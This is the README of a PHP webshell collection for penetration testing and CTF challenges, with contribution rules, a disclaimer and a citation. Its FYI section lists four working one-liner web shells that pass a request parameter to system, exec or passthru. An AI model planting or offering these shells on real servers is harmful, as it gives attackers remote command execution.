Contributing
============

To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).

PHP Webshells
=============

Common PHP shells is a collection of PHP webshells that you may need for your penetration testing (PT) cases or in a CTF challenge. 

Do not host any of the files on a publicly-accessible webserver (unless you know what you are up-to).

These are provided for education purposes only and legitimate PT cases.

I'll keep updating the collection whnever I stumble on any new webshell.

FYI
====


For basic features, I recommend one-liners like :

`<?php echo passthru($_GET['cmd']); ?>`

`<?php echo exec($_POST['cmd']); ?>`

`<?php system($_GET['cmd']); ?>`

`<?php passthru($_REQUEST['cmd']); ?>`


Cite:
=====

```
@software{jacques_pharand_2020_3748072,
  author       = {Jacques Pharand and
                  John Troon and
                  Javier Izquierdo Vera},
  title        = {JohnTroony/php-webshells: Collection CS1},
  month        = apr,
  year         = 2020,
  publisher    = {Zenodo},
  version      = {1.1},
  doi          = {10.5281/zenodo.3748072},
  url          = {https://doi.org/10.5281/zenodo.3748072}
}

```
